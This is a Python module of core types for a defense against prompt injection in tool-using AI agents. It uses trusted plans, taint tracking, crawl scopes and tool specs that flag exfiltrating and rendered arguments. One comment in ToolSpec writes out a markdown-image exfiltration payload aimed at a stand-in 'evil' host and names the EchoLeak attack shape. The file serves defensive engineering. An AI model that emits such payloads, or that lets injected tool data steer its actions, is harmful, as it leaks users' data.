"""Core types.

The design in one sentence: a Plan is produced from trusted input only, and the
executor runs *exactly* the plan's steps -- so data returned by tools (Tainted)
can fill declared argument slots but can never add, remove, reorder, or redirect
a tool call.
"""

from __future__ import annotations

from collections.abc import Callable
from dataclasses import dataclass, field
from typing import NewType

# Text that entered from the user at plan time. The planner's ONLY text
# parameter. A Tainted value is never a Trusted, so the type checker catches
# the exact footgun that would otherwise be a prose convention.
Trusted = NewType("Trusted", str)


@dataclass(frozen=True)
class Tainted:
    """A value originating from (or derived from) untrusted data.

    Taint is tracked at STORAGE granularity: a tool output stored in a slot is
    Tainted, and an output derived from any tainted argument stays tainted. It
    is NOT fine-grained tracking inside a value. That is acceptable because the
    guarantee does not rest on taint -- it rests on the control-flow gate in
    `runtime.execute`. Taint here is provenance, not the mechanism.
    """

    value: object
    source_step: int
    note: str = ""


@dataclass(frozen=True)
class SlotRef:
    slot: str


# An argument is a literal fixed by the trusted plan, or a reference to a
# declared data slot. It can NEVER be "whatever the untrusted data says".
Arg = str | int | float | bool | SlotRef


@dataclass(frozen=True)
class CrawlScope:
    """The plan-fixed destination space for frontier expansion.

    Every field is a plain literal type -- deliberately NOT `Arg`. A SlotRef
    cannot be typed into this structure, so untrusted data cannot widen the
    space it defines. That type choice IS the guarantee, not a convention.
    """

    allowed_hosts: tuple[str, ...]
    path_prefix: str = "/"
    allowed_schemes: tuple[str, ...] = ("https",)
    allowed_ports: tuple[int, ...] = (443,)
    max_depth: int = 1
    max_pages: int = 10
    max_bytes_per_page: int = 512 * 1024
    request_timeout_s: float = 10.0
    allow_loopback: bool = False


@dataclass(frozen=True)
class Step:
    tool: str
    args: dict[str, Arg]
    out: str | None = None
    when: str | None = None
    scope: CrawlScope | None = None
    allow_tainted_sink: bool = False


@dataclass(frozen=True)
class Plan:
    steps: tuple[Step, ...]
    rationale: str = ""
    allow_tainted_sink: bool = False
    plan_version: int = 1


@dataclass(frozen=True)
class Page:
    url: str
    status: int
    text: str
    depth: int
    fetched_at: str
    content_type: str = ""


@dataclass(frozen=True)
class PageSet:
    pages: tuple[Page, ...] = ()
    truncated: bool = False
    skipped: tuple[tuple[str, str], ...] = ()


@dataclass(frozen=True)
class ToolSpec:
    name: str
    description: str
    params: tuple[str, ...]
    impl: Callable[..., object]
    # Marks a tool whose effects leave the trust boundary. Reporting only -- the
    # mechanism is the plan gate (R6).
    exfiltrating: bool = False
    # Arguments naming the DESTINATION of an exfiltrating call. A Tainted value
    # here is blocked under default-deny. Declared on the tool so runtime.py
    # never hardcodes a tool name.
    sensitive_params: tuple[str, ...] = ()
    # Args whose value is eventually RENDERED to a human -- a terminal, a
    # markdown viewer, a log. A tainted value here is defanged before the tool
    # sees it, because rendering is itself a channel: `![](https://evil/?d=)` in
    # a file someone later opens auto-fetches. This is the EchoLeak shape, and
    # closing it structurally beats asking each tool to remember.
    render_params: tuple[str, ...] = ()
    # Maps declared args to the values the tool will ACTUALLY act on, so Layer 2
    # judges the effective destination rather than the literal the plan wrote.
    # Without this a relative path would be checked as "out.md" and acted on as
    # "<workspace>/out.md" -- the guard and the tool would be judging different
    # things, which is a soundness gap, not a convenience.
    effective: Callable[[dict[str, object]], dict[str, object]] | None = None


@dataclass
class ExecEvent:
    step_index: int
    tool: str
    resolved_args: dict[str, object]
    output_repr: str = ""
    blocked: bool = False
    reason: str = ""
    layer: str | None = None


@dataclass
class ExecResult:
    events: list[ExecEvent] = field(default_factory=list)
    data: dict[str, Tainted] = field(default_factory=dict)
    final_text: str = ""

    def tools_called(self) -> list[str]:
        return [e.tool for e in self.events if not e.blocked]

    def had_block(self) -> bool:
        return any(e.blocked for e in self.events)
